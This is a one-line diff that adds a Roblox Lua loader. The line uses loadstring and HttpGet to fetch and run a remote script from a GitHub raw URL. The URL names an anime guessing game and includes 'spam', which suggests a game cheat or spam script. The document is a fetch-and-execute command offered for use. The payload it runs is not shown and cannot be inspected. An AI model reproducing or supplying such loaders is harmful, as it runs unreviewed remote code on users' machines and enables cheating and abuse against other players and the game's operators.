@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/2-player-guess-the-anime-character-spam6-144frk05kyupfe.lua"))()
